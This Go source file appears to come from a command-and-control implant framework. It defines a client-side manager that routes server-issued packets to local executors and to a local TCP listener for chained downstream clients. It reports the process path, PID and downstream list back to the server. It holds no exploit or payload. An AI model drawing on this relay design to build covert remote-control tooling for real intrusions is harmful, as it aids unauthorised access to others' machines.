package client

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"strings"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

// Only used to translate downstream specific downstreaminfos from children
// into a more managable struct.
type DownstreamInfo struct {
	Name string
	Info string
}

type DownstreamManager struct {
	upstreamManager *UpstreamManager // used to send notifications about new downstream clients

	downstreamClient     *DownstreamClient
	downstreamClientInfo string

	downstreamLocaltcp         *DownstreamLocaltcp
	downstreamChangeNotifyChan chan struct{} // Notifies DownstreamManager about new connected downstreamclient
}

func MakeDownstreamManager(upstreamManager *UpstreamManager) DownstreamManager {
	// Get our name (for channel identification)
	ex, err := os.Executable()
	if err != nil {
		log.Error("Error: " + err.Error())
	}
	pid := strconv.Itoa(os.Getpid())
	downstreamClientInfo := ex + ":" + pid + "\n"

	downstreamClient := MakeDownstreamClient()
	downstreamLocaltcp := MakeDownstreamLocaltcp("")

	downstreamManager := DownstreamManager{
		upstreamManager:            upstreamManager,
		downstreamClient:           &downstreamClient,
		downstreamClientInfo:       downstreamClientInfo,
		downstreamLocaltcp:         &downstreamLocaltcp,
		downstreamChangeNotifyChan: make(chan struct{}),
	}
	return downstreamManager
}

// DoIncomingPacket will handle an incoming packet by send it to the appropriate downstream
func (dm *DownstreamManager) DoIncomingPacket(packet model.Packet) (model.Packet, error) {
	if packet.DownstreamId == "manager" {
		return dm.doManager(packet)
	} else if packet.DownstreamId == "client" {
		return dm.downstreamClient.Do(packet)
	} else if strings.HasPrefix(packet.DownstreamId, "net") { // e.g. "net#1"
		return dm.downstreamLocaltcp.Do(packet)
	} else {
		return packet, fmt.Errorf("Unknown downstreamid: %s", packet.DownstreamId)
	}
}

// doManager handles downstream server related packets (special downstream "manager")
func (dm *DownstreamManager) doManager(packet model.Packet) (model.Packet, error) {
	if packet.DownstreamId != "manager" {
		return packet, fmt.Errorf("Wrong args")
	}
	switch packet.PacketType {
	case "downstreamServerStart":
		ret, err := dm.StartListeners()
		if err != nil {
			packet.Response["error"] = err.Error()
			return packet, err
		} else {
			packet.Response["ret"] = ret
		}

	case "downstreamServerStop":
		ret, err := dm.StopListeners()
		if err != nil {
			packet.Response["error"] = err.Error()
			return packet, err
		} else {
			packet.Response["ret"] = ret
		}

	case "downstreamServers":
		downstreams := dm.DownstreamServers()
		for idx, downstreamInfo := range downstreams {
			idxStr := strconv.Itoa(idx)
			packet.Response["name"+idxStr] = downstreamInfo.Name
			packet.Response["info"+idxStr] = downstreamInfo.Info
		}

	default:
		packet.Response["error"] = "packettype not known: " + packet.PacketType
		return packet, fmt.Errorf("PacketType not known: " + packet.PacketType)
	}

	return packet, nil
}

// StartListeners will stop all downstream servers
func (dm *DownstreamManager) StopListeners() (string, error) {
	out := ""
	if dm.downstreamLocaltcp.Started() {
		err := dm.downstreamLocaltcp.Shutdown()
		if err != nil {
			return out, err
		} else {
			out = "Localtcp shutdown"
		}
	} else {
		out = "Not started"
	}
	return out, nil
}

// StartListeners will start all downstream servers
func (dm *DownstreamManager) StartListeners() (string, error) {
	out := ""

	o, err := dm.StartListenerLocaltcp()
	if err != nil {
		return out, err
	}
	out += o + "\n"

	return out, nil
}

func (dm *DownstreamManager) StartListenerLocaltcp() (string, error) {
	if dm.downstreamLocaltcp.Started() {
		return "", fmt.Errorf("LocalTcp already started")
	}
	err := dm.downstreamLocaltcp.StartServer(dm.downstreamChangeNotifyChan)
	if err != nil {
		return "", err
	}

	go func() { // Thread: receive new downstream clients. lifetime: app?
		for {
			// Wait for newly announced downstream clients
			<-dm.downstreamChangeNotifyChan

			// Notify server
			dm.SendDownstreamDataToServer()

			// TODO when to quit thread
		}
	}()
	out := "Started LocalTcp on " + dm.downstreamLocaltcp.ListenAddr()

	return out, nil
}

// SendDownstreams is used to notify the server about newly connected downstream clients
func (dm *DownstreamManager) SendDownstreamDataToServer() {
	// notify server of new downstream executors
	downstreamInfoClient := DownstreamInfo{
		"client",
		dm.downstreamClientInfo,
	}
	downstreamInfoTcp := dm.downstreamLocaltcp.DownstreamList()

	downstreams := make([]DownstreamInfo, 0)
	downstreams = append(downstreams, downstreamInfoClient)
	downstreams = append(downstreams, downstreamInfoTcp...)

	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	for idx, downstreamInfo := range downstreams {
		idxStr := strconv.Itoa(idx)
		response["name"+idxStr] = downstreamInfo.Name
		response["info"+idxStr] = downstreamInfo.Info
	}
	packet := model.NewPacket("downstreams", "", strconv.Itoa(int(rand.Uint64())), arguments, response)

	err := dm.upstreamManager.SendOutofband(packet)
	if err != nil {
		log.Errorf("Senddownstreams send error: %s", err.Error())
	}
}

// DownstreamServers returns the list of active downstream servers (e.g. Localtcp, if started)
func (dm *DownstreamManager) DownstreamServers() []DownstreamInfo {
	downstreams := make([]DownstreamInfo, 0)
	downstreamInfoClient := DownstreamInfo{
		"client",
		"default",
	}
	downstreams = append(downstreams, downstreamInfoClient)
	if dm.downstreamLocaltcp.Started() {
		downstreamInfoTcp := DownstreamInfo{
			"localtcp",
			"" + dm.downstreamLocaltcp.ListenAddr(),
		}
		downstreams = append(downstreams, downstreamInfoTcp)
	}

	return downstreams
}
